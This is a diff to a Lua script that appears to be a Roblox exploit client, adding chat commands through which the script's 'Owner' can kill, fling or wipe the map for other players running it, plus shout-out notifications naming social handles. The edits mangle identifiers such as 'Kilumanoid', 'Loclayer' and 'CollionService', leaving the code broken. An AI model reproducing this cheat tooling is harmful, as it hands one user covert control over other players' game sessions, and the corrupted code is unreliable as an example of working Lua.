@@ -5183,19 +5183,19 @@ task.spawn(function()
 
 				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						KillHumanoid(0)
+						Kilumanoid(0)
 					end)
 				end
 
 				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
+						Loclayer.Character.aryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
 				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
-						for i, v in next, CollectionService:GetTagged("block") do
+						for i, v in nt, CollionService:GetTagged("block") do
 							v:Destroy()
 						end
 					end)
@@ -5245,6 +5245,9 @@ task.spawn(function()
                 CreateNotification(5, "Tysm Modders")
                 CreateNotification(5, "@ModdedSploitOnTop")
                 CreateNotification(20, "Update when??!?!")
+                CreateNotification(5, "Modders Are. @jdjcxbdnfnfn")
+                CreateNotification(6, "@xjxhhe_1")
+                CreateNotification(8, "@ethyan_z12z")
 	end)
 
 	task.spawn(function()
